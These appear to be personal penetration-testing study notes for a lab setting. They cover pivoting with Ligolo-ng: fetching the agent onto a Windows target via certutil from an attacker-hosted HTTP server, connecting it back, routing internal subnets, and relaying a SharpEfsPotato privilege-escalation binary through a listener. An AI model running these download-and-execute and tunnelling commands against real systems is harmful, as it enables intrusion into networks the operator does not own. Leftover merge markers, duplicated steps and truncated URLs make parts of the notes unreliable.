add link for port 1234 on MS01 to connect to KALI 80
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
Listener_list
Listener_stop


KILL LIGOLO
```
sudo ip link delete ligolo
```
## 🔹 Step 0 — Identify Architecture

### Linux

```
uname -m
```

- `x86_64` → amd64
- `aarch64` → arm64
### Windows

**CMD**

```cmd
powershell $env:PROCESSOR_ARCHITECTURE
```

**PowerShell**

```powershell
$env:PROCESSOR_ARCHITECTURE
```

> ⚠️ Always match **agent/proxy binary architecture** to the target.

---

## 🔹 Step 1 — Download Ligolo Binaries (SKIP)

🔗 Release:  
[https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2)

---

# Step 2 & 3 in KALI ATTACKER

## 🔹 Step 2 — Create the TUN interface and bring it up:

```
sudo ip tuntap add user kali mode tun ligolo
```

```
sudo ip link set dev ligolo up
```

## 🔹 Step 3 — Start the Ligolo proxy server

- **Attacker (Kali)** → `proxy`
- **Target (Pivot host)** → `agent`

```
cd ~/Desktop/Tools/Ligolo && ./proxy -laddr 0.0.0.0:11601 -selfcert
```

---
### ⚠️ Error: Device or resource busy

If you see:

`ioctl(TUNSETIFF): Device or resource busy`

Fix:

`ip a | grep ligolo sudo ip link set ligolo up`

Or reset:

KILL LIGOLO
```
sudo ip link delete ligolo
```

```
 sudo ip tuntap add user kali mode tun ligolo 
```
 
```
sudo ip link set ligolo up
```

> ℹ️ TUN interface only needs to be created **once per reboot**

---
## 🔹 Step 4 — Execute agent in TARGET


On KALI ATTACKER
```
cd ~/Desktop/Tools/Ligolo/Agent && python -m http.server 80
```

- `x86_64` → amd64
- `aarch64` → arm64

Contains

Windows
1. WindowsAMD64Agent.exe
2. WindowsARM64Agent.exe

Transfer agent.exe onto target > Outfile agent.exe

Windows AMD64 > WindowsAMD64Agent.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/WindowsAMD64Agent.exe agent.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Execute agent in target shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `.\\agent.exe -connect ${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```

If restricted egress:

CMD
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `.\\agent.exe -connect https://${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```

Expected output:

![[Pasted image 20260913102354.png]]

![[Pasted image 20260913102406.png]]

`[INFO] Agent connected from 10.129.42.56... session`

Leave this running.

---
## 🔹 Step 5 — Establish the Tunnel & Route Traffic

In the Ligolo proxy interface:

```
session
```

Type `1` to select the agent session, then type `start`:

In a new Kali terminal, route the internal network interface (typically `10.129.42.0/24` or loopback `127.0.0.1/32` for local development servers) through your `ligolo` interface:

Based off this : 
`[INFO] Agent connected from 10.129.42.56... session`
F
or

Inside Ligolo console:

```
ifconfig
```

Look for internal TARGET subnet (e.g. `172.16.5.0/23`)

in KALI TERMINAL, Add specific IP route

REMEMBER to turn 10.10.10.X into 0 due to /24 subnet so 10.10.10.0
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo ip route add ${ip}/24 dev ligolo`;

dv.paragraph("```bash\n" + command + "\n```");
```
Verify:
```
ip route list
```

Fix : Delete route
```
sudo ip route del 10.129.42.0/24 dev ligolo
```


---

## 🔹 Step 9 — Verify Pivot

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ping ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
If ping works → pivot is **fully functional** ✅

---

# Transfer Files through Ligolo

### Step 1: Start your file server on Kali 

On KALI ATTACKER
=======
### Step 1: Start your file server on Kali (`1.1.1.1`)

Host the file on your attacker machine using Python's built-in HTTP server on a port of your choice (e.g., `80`).

```
python3 -m http.server 80
```

### Step 2: Set up a Listener in the Ligolo Proxy Console

On Kali machine, jump into your active Ligolo proxy session (the session handling the `2.2.2.2` agent) and tell it to forward traffic from `2.2.2.2` back to your Kali server.
=======
Use code with caution.

### Step 2: Set up a Listener in the Ligolo Proxy Console

On your Kali machine, jump into your active Ligolo proxy session (the session handling the `2.2.2.2` agent) and tell it to forward traffic from `2.2.2.2` back to your Kali server.

1. In the Ligolo-ng proxy interface, make sure you are interacting with the session for `2.2.2.2`.
2. Run the `listener_add` command:

ligolo-ng >> 
```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
```


```
ligolo-ng » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
```

- **What this does:** This tells the agent running on `2.2.2.2` to listen on port `1234` on all its interfaces. Any traffic hitting `2.2.2.2:1234` will be automatically encrypted and forwarded through the tunnel back to port `80` on your Kali machine (`1.1.1.1`).

### Step 3: Download the file from the Internal Host (`3.3.3.3`)

ON TARGET or terminal session on `3.3.3.3`. Instead of requesting the file from `1.1.1.1` (which it cannot reach), **request the file from `2.2.2.2` on the listener port (`1234`)**.

Depending on the operating system of `3.3.3.3`, use one of the following commands:

Windows (PowerShell):**
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}:1234/SharpEfsPotato.exe SharpEfsPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
Invoke-WebRequest -Uri "http://2.2.2" -OutFile "C:\Windows\Temp\yourfile.exe"
```

```
iwr -uri "http://2.2.2" -outfile "C:\Windows\Temp\yourfile.exe"
```

Now, switch to your Evil-WinRM shell or terminal session on `3.3.3.3`. Instead of requesting the file from `1.1.1.1` (which it cannot reach), **request the file from `2.2.2.2` on the listener port (`1234`)**.

Depending on the operating system of `3.3.3.3`, use one of the following commands:

- **If `3.3.3.3` is Windows (PowerShell):**
    
    powershell
    
    ```
    Invoke-WebRequest -Uri "http://2.2.2" -OutFile "C:\Windows\Temp\yourfile.exe"
    # Or the shorter alias:
    iwr -uri "http://2.2.2" -outfile "C:\Windows\Temp\yourfile.exe"
    ```
    
    Use code with caution.
    
- **If `3.3.3.3` is Linux:**
 
    ```
    wget http://2.2.2
    # Or
    curl -O http://2.2.2
    ```
